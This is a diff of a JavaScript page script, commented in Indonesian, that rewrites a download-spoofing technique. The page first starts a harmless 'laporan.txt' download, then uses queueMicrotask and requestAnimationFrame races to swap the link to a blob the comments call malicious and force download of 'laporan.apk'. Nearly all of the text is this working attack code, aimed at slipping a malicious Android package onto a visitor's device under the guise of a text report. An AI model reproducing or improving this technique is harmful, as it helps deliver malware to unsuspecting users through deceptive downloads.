@@ -50,55 +50,50 @@
   var safeUrl = URL.createObjectURL(safeBlob);
 
   // ============================================
-  // 2. REVERSE RACE CONDITION (APK FIRST)
+  // 2. MICROTASK RACE CONDITION
   // ============================================
   document.getElementById('startBtn').addEventListener('click', function() {
-    statusEl.innerText = "Memulai Reverse Race Condition...";
+    statusEl.innerText = "Memulai Microtask Race...";
 
     var a = document.createElement('a');
     a.style.display = 'none';
     document.body.appendChild(a);
 
-    // LANGKAH 1: Set ke APK (Jahat)
-    a.href = maliciousUrl;
-    a.download = 'laporan.apk';
+    // A. Set ke file AMAN (TXT)
+    a.href = safeUrl;
+    a.download = 'laporan.txt';
     
-    // Picu Unduhan APK
+    // B. Picu Unduhan
     a.click();
-    statusEl.innerText = "Mengirim APK...";
 
-    // LANGKAH 2: RACE CONDITION
-    // Timpa dengan TXT secepat mungkin.
-    // Tujuannya: Browser mungkin sudah mulai menulis APK ke disk,
-    // lalu kita paksa antrean berubah ke TXT.
+    // C. RACE CONDITION (MICROTASK)
+    // Kita eksekusi perubahan href SEGERA setelah click() selesai,
+    // sebelum browser sempat memproses event loop berikutnya.
     
-    var attempts = 0;
-    function raceToTXT() {
-      attempts++;
-      
-      // Ganti ke file TXT
-      a.href = safeUrl;
-      a.download = 'laporan.txt';
+    queueMicrotask(function() {
+      // Ganti ke file JAHAT (APK)
+      a.href = maliciousUrl;
+      a.download = 'laporan.apk';
       
       // Trigger ulang
       a.click();
+      statusEl.innerText = "Mengirim APK via Microtask...";
 
-      if (attempts < 5) {
-        setTimeout(raceToTXT, 0); // 0ms
-      } else {
-        // Cleanup
-        setTimeout(function() {
-          document.body.removeChild(a);
-          URL.revokeObjectURL(safeUrl);
-          URL.revokeObjectURL(maliciousUrl);
-          statusEl.innerText = "Selesai. Cek folder Downloads.";
-        }, 5000);
-      }
-    }
+      // Coba satu kali lagi dengan requestAnimationFrame (tick berikutnya)
+      requestAnimationFrame(function() {
+        a.href = maliciousUrl;
+        a.download = 'laporan.apk';
+        a.click();
+      });
+    });
 
-    // Mulai race
-    setTimeout(raceToTXT, 0);
-
+    // Cleanup
+    setTimeout(function() {
+      document.body.removeChild(a);
+      URL.revokeObjectURL(safeUrl);
+      URL.revokeObjectURL(maliciousUrl);
+      statusEl.innerText = "Selesai. Cek folder Downloads.";
+    }, 5000);
   });
 
 })();
